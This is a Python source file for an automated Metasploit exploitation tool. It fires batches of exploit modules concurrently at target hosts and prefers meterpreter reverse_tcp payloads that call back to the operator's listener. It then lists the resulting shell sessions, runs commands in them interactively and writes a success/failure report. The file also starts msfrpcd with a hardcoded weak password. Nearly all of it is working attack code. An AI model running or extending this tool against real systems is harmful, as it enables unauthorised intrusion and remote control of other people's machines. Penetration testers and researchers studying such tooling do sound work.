import time
from pymetasploit3.msfrpc import MsfRpcClient
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging.handlers
from colorama import Fore, Style, init
from rich.console import Console
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
import matplotlib.pyplot as plt
import subprocess

console = Console()

# Set up logging with rotation
log_handler = logging.handlers.RotatingFileHandler('exploit.log', maxBytes=5*1024*1024, backupCount=2)

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.WARNING, handlers=[log_handler],format='%(asctime)s - %(levelname)s - %(message)s')


def choose_exploit_auto_run_non_verbose(client, exploits, rhosts, lhost, lport, max_retries=3, max_workers=5):
    """
    Attempt to run a list of exploits non-verbosely.

    Args:
    - client: The Metasploit client object
    - exploits: List of exploit names to run
    - rhosts: The remote host(s) to target
    - lhost: The local host for payload callbacks
    - lport: The local port for payload callbacks
    - max_retries: Maximum number of retries for each exploit
    - max_workers: Maximum number of concurrent exploit attempts

    Returns:
    - dict: Results of exploit attempts, keyed by exploit name
    """
    exploit_results = {}
    successful_exploits = set()
    total_exploits = len(exploits)
    completed_exploits = 0
    payloads_used = {}

    logging.info("Starting exploit attempts...")

    def run_exploit(exploit_name, rhosts, lhost, lport, retries):
        """
        Attempt to run a specific exploit against the target host(s) with multiple retries.

        Args:
        - exploit_name (str): The name of the exploit module to use.
        - rhosts (str): The remote host(s) to target.
        - lhost (str): The local host for payload callbacks.
        - lport (int): The local port for payload callbacks.
        - retries (int): The number of retry attempts if the exploit fails.

        Returns:
        - tuple: A tuple containing the exploit name and the result of the attempt (or None if failed).
        """
        for attempt in range(retries):
            try:
                logging.info(f"Attempt {attempt + 1} for exploit: {exploit_name}")
                exploit = exploit_name.split("exploit/")[1]
                module = client.modules.use('exploit', exploit)

                if not module:
                    logging.warning(f"Failed to load exploit module: {exploit_name}")
                    return (exploit_name, None)

                # Set options
                if 'RHOSTS' in module.options:
                    module['RHOSTS'] = rhosts
                if 'LHOST' in module.options:
                    module['LHOST'] = lhost
                if 'LPORT' in module.options:
                    module['LPORT'] = lport

                # Dynamic payload selection
                best_payload = select_best_payload(module.payloads)
                payloads_used[exploit_name] = best_payload
                if best_payload:
                    result = module.execute(payload=best_payload)
                    if result and result.get('job_id'):
                        return (exploit_name, result)
                else:
                    logging.warning(f"No suitable payload found for exploit: {exploit_name}")

            except Exception as e:
                logging.error(f"Error executing exploit {exploit_name}: {e}")

        logging.warning(f"All attempts failed for exploit: {exploit_name}")
        return (exploit_name, None)

    def select_best_payload(payloads):
        """
        Select the best payload from a list of available payloads based on preferred payloads.

        Args:
        - payloads (list): A list of available payloads.

        Returns:
        - str: The selected payload, or the first available payload if no preferred payload is found.
        """
        # Enhanced logic to select the best payload
        preferred_payloads = [
            'windows/meterpreter/reverse_tcp', 
            'linux/x86/meterpreter/reverse_tcp',
            'java/meterpreter/reverse_tcp'
        ]
        for payload in preferred_payloads:
            if payload in payloads:
                return payload
        return payloads[0] if payloads else None

    def show_progress(completed, total):
        """
        Display a progress bar indicating the completion percentage of exploit attempts.

        Args:
        - completed (int): The number of completed exploit attempts.
        - total (int): The total number of exploit attempts.
        """
        percent = (completed / total) * 100
        bar_length = 50
        filled_length = int(bar_length * completed // total)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        print(f"\rProgress: |{bar}| {percent:.2f}% Complete", end='\r')
        if completed == total:
            print()  # New line at the end of the progress bar

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_exploit = {
            executor.submit(run_exploit, exploit, rhosts, lhost, lport, max_retries): exploit 
            for exploit in exploits
        }

        for future in as_completed(future_to_exploit):
            exploit_name = future_to_exploit[future]
            try:
                exploit_name, result = future.result()
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)
                if exploit_name not in exploit_results:
                    exploit_results[exploit_name] = result
                if result:
                    successful_exploits.add(exploit_name)
            except Exception as e:
                logging.error(f"Unhandled exception for exploit {exploit_name}: {e}")
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)

    logging.info("Exploit attempts completed.")

    return exploit_results


def choose_exploit_auto_run_verbose(client, exploits, rhosts, lhost, lport, max_retries=3, max_workers=5):
    """
    Attempt to run a list of exploits verbosely, providing detailed output.

    Args:
    - client: The Metasploit client object
    - exploits: List of exploit names to run
    - rhosts: The remote host(s) to target
    - lhost: The local host for payload callbacks
    - lport: The local port for payload callbacks
    - max_retries: Maximum number of retries for each exploit
    - max_workers: Maximum number of concurrent exploit attempts

    Returns:
    - dict: Results of exploit attempts, keyed by exploit name
    """
    exploit_results = {}
    successful_exploits = set()
    total_exploits = len(exploits)
    completed_exploits = 0
    payloads_used = {}

    logging.info("Starting exploit attempts...")
    print(Fore.BLUE + "Initiating exploitation attempts...\n")

    def run_exploit(exploit_name, rhosts, lhost, lport, retries):
        """
        Execute an exploit with multiple attempts and dynamic payload selection.

        Args:
        - exploit_name (str): Name of the exploit.
        - rhosts (str): The remote host(s) to target.
        - lhost (str): The local host for payload callbacks.
        - lport (int): The local port for payload callbacks.
        - retries (int): Maximum number of retries for each exploit.

        Returns:
        - tuple: A tuple containing the exploit name and result if successful, otherwise None.
        """
        for attempt in range(retries):
            try:
                logging.info(f"Attempt {attempt + 1} for exploit: {exploit_name}")
                exploit = exploit_name.split("exploit/")[1]
                module = client.modules.use('exploit', exploit)

                if not module:
                    logging.warning(f"Failed to load exploit module: {exploit_name}")
                    print(Fore.RED + f"Failed to load exploit module: {exploit_name}")
                    return (exploit_name, None)

                # Set options
                if 'RHOSTS' in module.options:
                    module['RHOSTS'] = rhosts
                if 'LHOST' in module.options:
                    module['LHOST'] = lhost
                if 'LPORT' in module.options:
                    module['LPORT'] = lport

                # Dynamic payload selection
                best_payload = select_best_payload(module.payloads)
                payloads_used[exploit_name] = best_payload
                if best_payload:
                    logging.info(f"Using payload: {best_payload}")
                    result = module.execute(payload=best_payload)
                    logging.info(f"Exploit result for {exploit_name}: {result}")
                    if result and result.get('job_id'):
                        print(Fore.GREEN + f"Successfully exploited: {exploit_name}")
                        return (exploit_name, result)
                    else:
                        logging.warning(f"Failed to execute payload for exploit: {exploit_name}")
                        print(Fore.RED + f"Failed to execute payload for exploit: {exploit_name}")
                else:
                    logging.warning(f"No suitable payload found for exploit: {exploit_name}")
                    print(Fore.RED + f"No suitable payload found for exploit: {exploit_name}")

            except Exception as e:
                logging.error(f"Error executing exploit {exploit_name}: {e}")
                print(Fore.RED + f"Error executing exploit {exploit_name}: {e}")

        logging.warning(f"All attempts failed for exploit: {exploit_name}")
        print(Fore.RED + f"All attempts failed for exploit: {exploit_name}")
        return (exploit_name, None)

    def select_best_payload(payloads):
        """
        Select the best payload from a list of available payloads based on preferred payloads.

        Args:
        - payloads (list): A list of available payloads.

        Returns:
        - str: The selected payload, or the first available payload if no preferred payload is found.
        """
        # Enhanced logic to select the best payload
        preferred_payloads = [
            'windows/meterpreter/reverse_tcp', 
            'linux/x86/meterpreter/reverse_tcp',
            'java/meterpreter/reverse_tcp'
        ]
        for payload in preferred_payloads:
            if payload in payloads:
                return payload
        return payloads[0] if payloads else None

    def show_progress(completed, total):
        """
        Display a progress bar indicating the completion percentage of exploit attempts.

        Args:
        - completed (int): The number of completed exploit attempts.
        - total (int): The total number of exploit attempts.
        """
        percent = (completed / total) * 100
        bar_length = 50
        filled_length = int(bar_length * completed // total)
        bar = '=' * filled_length + '-' * (bar_length - filled_length)
        print(f"\rProgress: |{bar}| {percent:.2f}% Complete", end='\r')
        if completed == total:
            print()  # New line at the end of the progress bar

    print("\nChosen Payloads:\n")
    for exploit in exploits:
        best_payload = select_best_payload(client.modules.use('exploit', exploit.split("exploit/")[1]).payloads)
        payloads_used[exploit] = best_payload
        print(Fore.YELLOW + f"Using payload: {best_payload} for exploit: {exploit}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_exploit = {
            executor.submit(run_exploit, exploit, rhosts, lhost, lport, max_retries): exploit 
            for exploit in exploits
        }

        print("\nCurrently exploiting:\n")
        for future in as_completed(future_to_exploit):
            exploit_name = future_to_exploit[future]
            try:
                exploit_name, result = future.result()
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)
                print(Fore.YELLOW + f"\nCurrently exploiting: {exploit_name} {completed_exploits * 100 / total_exploits:.2f}% Complete")
                if exploit_name not in exploit_results:
                    exploit_results[exploit_name] = result
                if result:
                    successful_exploits.add(exploit_name)
            except Exception as e:
                logging.error(f"Unhandled exception for exploit {exploit_name}: {e}")
                print(Fore.RED + f"Unhandled exception for exploit {exploit_name}: {e}")
                completed_exploits += 1
                show_progress(completed_exploits, total_exploits)

    logging.info("Exploit attempts completed.")
    print(Fore.GREEN + "\nExploit attempts completed.")

    if successful_exploits:
        print(Fore.GREEN + "Successful exploits:")
    else:
        print(Fore.RED + "No successful exploits found.")

    for exploit in successful_exploits:
        print(Fore.GREEN + f"- {exploit}")

    print("\nDetailed exploit results:\n")
    for exploit, result in exploit_results.items():
        if result:
            job_id = result.get('job_id', 'N/A')
            uuid = result.get('uuid', 'N/A')
            print(Fore.CYAN + f"  - {exploit}:\n    Job ID: {job_id}\n    UUID: {uuid}")
        else:
            print(Fore.RED + f"  - {exploit}: Failed")

    return exploit_results

def handle_exploit_result1(exploit_result):
    """
    Handle the result of an exploit attempt.

    Args:
    - exploit_result: The result dictionary from an exploit attempt

    Returns:
    - bool: True if the exploit was successful (contains a 'job_id'), otherwise False
    """
    return exploit_result and 'job_id' in exploit_result


def compare_exploit_counts(cve_exploits, service_name_exploits, service_name_version_exploits, criteria_exploits):
    """
    Compare the counts of exploits available based on different filtering criteria.

    Args:
    - cve_exploits: List of exploits filtered by CVE
    - service_name_exploits: List of exploits filtered by service name
    - service_name_version_exploits: List of exploits filtered by service name and version
    - criteria_exploits: List of exploits filtered by combined criteria

    Returns:
    - list: The list of exploit modules from the filtering criteria with the lowest count
    """
    try:
        # Calculate counts for each set of filtered exploit modules
        counts = {
            "CVE": len(cve_exploits),
            "Service Name": len(service_name_exploits),
            "Service Name & Version": len(service_name_version_exploits),
            "Combined Criteria": len(criteria_exploits)
        }

        # Remove counts with null values
        counts = {key: value for key, value in counts.items() if value > 0}

        if not counts:
            print("No exploit modules found for any filtering criteria.")
            return []

        # Find the function with the lowest count
        min_count_function = min(counts, key=counts.get)

        # Return the list of exploit modules from the function with the lowest count
        if min_count_function == "CVE":
           print("The minimum exploit is : CVE") 
           return cve_exploits
        elif min_count_function == "Service Name":
            print("The minimum exploit is : Service Name") 
            return service_name_exploits
        elif min_count_function == "Service Name & Version":
            print("The minimum exploit is : Service Name & Version") 
            return service_name_version_exploits
        else:
            print("The minimum is criteria exploits")
            return criteria_exploits
    except Exception as e:
        print(f"Error occurred while comparing exploit counts: {e}")
        return []



def open_session(client):
    """
    Open and interact with a successful session.

    Args:
    - client: The Metasploit client object

    Returns:
    - None
    """
    try:
        successful_sessions = client.sessions.list
        if successful_sessions:
            table = Table(title="Successfully Created Sessions")
            table.add_column("Session ID", justify="center", style="cyan")
            table.add_column("Type", justify="center", style="cyan")
            table.add_column("Host", justify="center", style="cyan")
            table.add_column("Payload", justify="center", style="cyan")
            table.add_column("Module", justify="center", style="cyan")
            table.add_column("UUID", justify="center", style="cyan")

            for session_id, session_info in successful_sessions.items():
                if session_info['type'] == 'shell':
                    table.add_row(
                        session_id,
                        session_info['type'],
                        session_info['session_host'],
                        session_info['via_payload'],
                        session_info['via_exploit'],
                        session_info['uuid']
                    )

            console.print(table)

            while True:
                print("\n")
                chosen_session_id = Prompt.ask("Enter the Session ID you want to interact with")
                if chosen_session_id in successful_sessions:
                    session_info = successful_sessions[chosen_session_id]
                    if session_info['type'] == 'shell':
                        console.print("You are interacting with the session created by the module: {session_info['via_exploit']}")
                        interact_with_session(client.sessions.session(chosen_session_id))
                    else:
                        console.print("Selected session is not a shell session.")
                else:
                    console.print(Panel("Invalid Session ID. Please enter a valid Session ID.", style="red"))

                interact_again = Prompt.ask("Do you want to interact with another session? (y/n)")
                if interact_again.lower() != 'y':
                    break
        else:
            console.print(Panel("No successful shell sessions found.", style="red"))
    except Exception as e:
        console.print(Panel(f"Error occurred while retrieving successful sessions: {e}", style="red"))

def interact_with_session(session):
    """
    Interact with a shell session.

    Args:
    - session: The session object to interact with

    Returns:
    - None
    """
    console.print(Panel("Entering session. Type 'exit' to quit the session.", style="green"))
    while True:
        command = input(Fore.YELLOW+"Enter command >> ")
        if command.lower() == 'exit':
            break
        session.write(command)
        response = session.read()
        console.print(Panel(response, title="Session Output", style="white"))

    console.print(Panel("Exiting session.", style="green"))

def generate_report_en(client, service_exploits, md_filename='Final_result.md'):
    """
    Generate an exploitation report in Markdown format.

    Args:
    - client: The Metasploit client object
    - service_exploits: Dictionary of service names to their corresponding exploits
    - md_filename: Filename for the Markdown report (default: 'Final_result.md')

    Returns:
    - None
    """
    try:
        print("Exploitation Report:")
        print("-------------------")

        # Retrieve session list
        session_list = client.sessions.list

        # Identify successful exploits
        via_exploits = [session_info.get('via_exploit') for session_info in session_list.values()]

        # Counters for analysis
        total_exploits = 0
        successful_count = 0
        unsuccessful_count = 0

        # Open the Markdown file and prepare to write
        with open(md_filename, mode='w') as file:
            # Write the header of the Markdown file
            file.write("# Exploitation Report\n\n")
            file.write("-------------------\n\n")

            # Print and write information about the target host and services scanned
            target_host = "unknown"  # Placeholder if not available in session_list
            if session_list:
                # Attempt to get target host info if available
                target_host = next(iter(session_list.values())).get('target_host', 'unknown')

            services_scanned = list(service_exploits.keys())
            file.write(f"## Target Host: {target_host}\n\n")
            file.write("## Services Scanned:\n")
            print(f"Target Host: {target_host}")
            print("Services Scanned:")

            successful_exploits = []
            for via_exploit in via_exploits:
                if via_exploit:
                    successful_exploits.append(via_exploit)

            for service_name in services_scanned:
                exploits_for_service = service_exploits[service_name]
                if not exploits_for_service:  # Check if the service has any exploits
                    continue

                file.write(f"### Service Name: {service_name}\n")
                file.write("| Exploit Name | Result |\n")
                file.write("|--------------|--------|\n")
                print(f"- Service Name: {service_name}")
                print("  Exploits Attempted:")
                unique_exploits = set(exploits_for_service)  # Use a set to avoid duplicates
                for exploit_name in unique_exploits:
                    total_exploits += 1
                    result = "Successful" if exploit_name in successful_exploits else "Unsuccessful"
                    if result == "Successful":
                        successful_count += 1
                    else:
                        unsuccessful_count += 1
                    file.write(f"| {exploit_name} | {result} |\n")
                    print(f"    - {exploit_name}: {result}")

                file.write("\n-------------------\n\n")
                print("-------------------")

            # Separate successful exploits
            standard_exploits = ["exploit/" + exploit for exploits in service_exploits.values() for exploit in exploits]
            successful_exploits = [exploit.replace("exploit/", "") for exploit in standard_exploits if exploit in successful_exploits]
            unique_successful_exploits = set(successful_exploits)  # Use a set to avoid duplicates
            file.write("## Summary of Successful Exploits:\n")
            print("Summary of Successful Exploits:")
            for exploit in unique_successful_exploits:
                file.write(f"- {exploit}\n")
                print(f"- {exploit}")

            file.write("\n-------------------\n")

            # Analysis Section
            file.write("## Analysis\n")
            file.write(f"Total Exploits Attempted: {total_exploits}\n")
            file.write(f"Total Successful Exploits: {successful_count}\n")
            file.write(f"Total Unsuccessful Exploits: {unsuccessful_count}\n\n")

            # Generate and save the chart
            labels = ['Successful', 'Unsuccessful']
            sizes = [successful_count, unsuccessful_count]
            colors = ['#4CAF50', '#F44336']
            explode = (0.1, 0)  # explode the 1st slice

            plt.figure(figsize=(6, 6))
            plt.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', shadow=True, startangle=140)
            plt.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
            chart_filename = 'exploit_analysis_chart.png'
            plt.savefig(chart_filename)
            plt.close()

            # Reference the chart in the Markdown file
            file.write("![Exploit Analysis Chart](exploit_analysis_chart.png)\n\n")

            general_recommendations = (
                "1. Regularly update and patch all systems to mitigate known vulnerabilities.\n"
                "2. Use network segmentation and firewall rules to limit the spread of attacks.\n"
                "3. Implement intrusion detection and prevention systems (IDS/IPS) to detect and block malicious activities.\n"
                "4. Conduct regular security assessments and penetration tests to identify and remediate vulnerabilities.\n"
                "5. Educate employees on cybersecurity best practices to prevent social engineering attacks.\n"
            )

            file.write("### General Recommendations:\n")
            file.write(general_recommendations)

            print("## Analysis")
            print(f"Total Exploits Attempted: {total_exploits}")
            print(f"Total Successful Exploits: {successful_count}")
            print(f"Total Unsuccessful Exploits: {unsuccessful_count}")
            print("\nGeneral Recommendations:")
            print(general_recommendations)

    except Exception as e:
        print("Error occurred while generating the report:", e)



def close_session(client, session_id):
    try:
        client.sessions.session(session_id).stop()
        console.print(f"[bold green]Session {session_id} closed successfully.[/bold green]")
    except Exception as e:
        console.print(f"[bold green]Failed to close session {session_id}: {e}[/bold green]")

def close_sessions(client, sessions):
    console.print(Panel("[bold green]Closing all sessions...[/bold green]", expand=False))
    with console.status("[bold green]Processing...[/bold green]", spinner="dots"):
        for session_id in sessions.keys():
            close_session(client, session_id)
            time.sleep(0.5)  
    console.print(Panel("[bold green]All sessions have been closed successfully.[/bold green]", expand=False))

def close_all_sessions(client):
    """
     Closes all currently open sessions.
    
     Parameters:
         client (MsfRpcClient): The client object used to communicate with the Metasploit RPC server.
    
      Returns:
        None
     """
    try:
        # Retrieve the list of active sessions
        sessions = client.sessions.list

        if sessions:
            # Display active sessions
            table = Table(title="Active Sessions")
            table.add_column("Session ID", justify="center", style="cyan")
            table.add_column("Type", justify="center", style="cyan")
            table.add_column("Host", justify="center", style="cyan")
            table.add_column("Payload", justify="center", style="cyan")
            table.add_column("Module", justify="center", style="cyan")
            table.add_column("UUID", justify="center", style="cyan")

            for session_id, session_info in sessions.items():
                table.add_row(
                    session_id,
                    session_info['type'],
                    session_info['session_host'],
                    session_info['via_payload'],
                    session_info['via_exploit'],
                    session_info['uuid']
                )

            console.print(table)

            # Ask user if they want to close all sessions
            user_input = Prompt.ask("[bold green]Do you want to close all sessions? (y/n): [/bold green]").strip().lower()
            
            if user_input == 'y':
                console.print(Panel("[bold green]Closing all sessions...[/bold green]", expand=False))
                with console.status("[bold green]Processing...[/bold green]", spinner="dots"):
                    for session_id in sessions.keys():
                        close_session(client, session_id)
                        time.sleep(0.5)  # Simulate some delay for closing each session
                console.print(Panel("[bold green]All sessions have been closed successfully.[/bold green]", expand=False))
            
            elif user_input == 'n':
                # Ask for specific session ID to close
                session_to_close = Prompt.ask("[bold green]Which session do you want to close? (Enter Session ID): [/bold green]")
                if session_to_close in sessions:
                    close_session(client, session_to_close)
                else:
                    console.print(f"[bold red]Invalid session ID: {session_to_close}[/bold red]")
            else:
                console.print(Panel("[bold red]Invalid input. All sessions are being closed.[/bold red]", expand=False))
                with console.status("[bold green]Processing...[/bold green]", spinner="dots"):
                    for session_id in sessions.keys():
                        close_session(client, session_id)
                        time.sleep(0.5)  # Simulate some delay for closing each session
                console.print(Panel("[bold green]All sessions have been closed successfully.[/bold green]", expand=False))
        else:
            console.print(Panel("[bold green]No active sessions to close.[/bold green]", expand=False))

    except Exception as e:
        console.print(Panel(f"[bold red]Error occurred while closing sessions: {e}[/bold red]", expand=False))



def manage_msfrpcd():
    """
    Manage the Metasploit RPC daemon (msfrpcd).

    This function checks if msfrpcd is running and if port 55552 is open. If msfrpcd is not running
    and port 55552 is not in use, it starts msfrpcd. Otherwise, it prints a message indicating that
    msfrpcd is already running or the port is in use.

    Returns:
    - None
    """
    msfrpcd_command = ["msfrpcd", "-U", "msf", "-P", "abc123", "-p", "55552"]
    check_command = "pgrep -a msfrpcd"
    port_check_command = "netstat -tuln | grep 55552"

    def is_msfrpcd_running():
        try:
            result = subprocess.run(check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.stdout:
                print("msfrpcd is already running.")
                return True
            else:
                return False
        except Exception as e:
            print(f"Error checking msfrpcd process: {e}")
            return False

    def is_port_open():
        try:
            result = subprocess.run(port_check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.stdout:
                print("Port 55552 is already open.")
                return True
            else:
                return False
        except Exception as e:
            print(f"Error checking port: {e}")
            return False
        
    def start_msfrpcd():
        try:
            # Start msfrpcd without printing the output
            #print("Starting msfrpcd...")
            subprocess.run(msfrpcd_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("msfrpcd started.")
           
            # Delay after starting msfrpcd
            print("Waiting for 10 seconds after starting msfrpcd...")
            time.sleep(20)
        except Exception as e:
            print(f"Error starting msfrpcd: {e}")

    if not is_msfrpcd_running() and not is_port_open():
        start_msfrpcd()
    else:
        print("msfrpcd is already running or port is in use.")


def send_scripts(client):
    print("The auto send scripts is coming soon...so stay updated :)")
